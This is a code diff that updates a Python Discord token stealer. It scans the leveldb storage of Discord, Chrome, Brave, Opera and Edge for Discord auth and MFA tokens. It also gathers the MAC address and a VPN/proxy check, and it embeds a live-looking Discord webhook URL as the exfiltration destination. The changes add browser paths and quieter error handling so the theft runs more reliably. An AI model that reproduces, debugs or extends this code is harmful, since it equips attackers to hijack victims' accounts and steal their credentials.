@@ -30,6 +30,7 @@ from subprocess import Popen, PIPE
 from json import loads, dumps
 from shutil import copyfile
 from sys import argv
+from pathlib import Path
 
 # CONFIG -> Setup before compiling
 url= "https://discord.com/api/webhooks/1364782214730223756/UQjz4-yWRDGVK4lrTNwdLPQ9vL7GUo5nONrAOGKXiqpAATtL6btmiAJR8i8SmerbKar8" #Paste Discord Webhook url
@@ -61,55 +62,51 @@ vpn = requests.get('http://ip-api.com/json?fields=proxy')
 proxy = vpn.json()['proxy']
 mac = get_mac()
 
-
-roaming = os.getenv('AppData')
+roaming = os.getenv('APPDATA')
+local = os.getenv('LOCALAPPDATA')
 ## Output for txt file location
 output = open(roaming + "temp.txt", "a")
 
 
 ## Discord Locations
 Directories = {
-        'Discord': roaming + '\\Discord',
-        'Discord Two': roaming + '\\discord',
-        'Discord Canary': roaming + '\\Discordcanary',
-        'Discord Canary Two': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Discord': Path(roaming) / 'Discord',
+    'Discord Canary': Path(roaming) / 'discordcanary',
+    'Discord PTB': Path(roaming) / 'discordptb',
+    'Google Chrome': Path(local) / 'Google' / 'Chrome' / 'User Data' / 'Default',
+    'Brave': Path(local) / 'BraveSoftware' / 'Brave-Browser' / 'User Data' / 'Default',
+    'Opera': Path(roaming) / 'Opera Software' / 'Opera Stable',
+    'Edge': Path(local) / 'Microsoft' / 'Edge' / 'User Data' / 'Default'
 }
 
 
 ## Scan for the regex [\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}
 def Yoink(Directory):
-    Directory += '\\Local Storage\\leveldb'
-    Tokens = []
-    
     try:
-        if not os.path.exists(Directory):
+        leveldb = Path(Directory) / 'Local Storage' / 'leveldb'
+        if not leveldb.exists():
             return []
             
-        for FileName in os.listdir(Directory):
-            if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
+        Tokens = []
+        
+        for FileName in os.listdir(leveldb):
+            if not (FileName.endswith('.log') or FileName.endswith('.ldb')):
                 continue
-
+                
             try:
-                with open(f'{Directory}\\{FileName}', errors='ignore') as f:
+                with open(leveldb / FileName, 'r', errors='ignore') as f:
                     for line in f:
                         line = line.strip()
                         if line:
-                            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                                for Token in re.findall(regex, line):
-                                    Tokens.append(Token)
+                            for regex in [r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}']:
+                                Tokens.extend(re.findall(regex, line))
             except Exception as e:
-                print(f"Error reading {FileName}: {e}")
                 continue
                 
-    except Exception as e:
-        print(f"Error accessing directory {Directory}: {e}")
+        return Tokens
         
-    return Tokens
+    except Exception:
+        return []
 
 
 ## Wipe the temp file
@@ -156,20 +153,32 @@ ADP = os.environ['LOCALAPPDATA']
 
 def sniff(path):
     path += '\\Local Storage\\leveldb'
-
     tokens = []
+
+    if not os.path.exists(path):  # Check if the path exists first
+        return tokens  # Return empty list if directory doesn't exist
+
     try:
         for file_name in os.listdir(path):
             if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                 continue
 
-            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                    for token in re.findall(regex, line):
-                        tokens.append(token)
-        return tokens
-    except:
-        pass
+            file_path = os.path.join(path, file_name)
+            try:
+                with open(file_path, 'r', errors='ignore') as file:
+                    for line in file:
+                        line = line.strip()
+                        if not line:
+                            continue
+                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                            for token in re.findall(regex, line):
+                                tokens.append(token)
+            except (PermissionError, UnicodeDecodeError) as e:
+                continue  # Skip problematic files instead of crashing
+    except Exception as e:
+        print(f"[!] Error in sniff(): {e}")  # Optional: Log the error
+    finally:
+        return tokens  # Always return a list, even if empty
 
 
 def encrypt(cipher, plaintext, nonce):
@@ -293,7 +302,6 @@ def beamed():
     except:
         pass
 
-
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
     paths = {
@@ -304,7 +312,7 @@ def beamed():
         'Opera': roaming + '\\Opera Software\\Opera Stable',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
+    }  
 
     message = '\n'
     for platform, path in paths.items():
@@ -315,7 +323,7 @@ def beamed():
 
         tokens = sniff(path)
 
-        if len(tokens) > 0:
+        if tokens and len(tokens) > 0:  # Fix: Check if tokens exists and is not empty
             for token in tokens:
                 message += f'{token}\n'
         else:
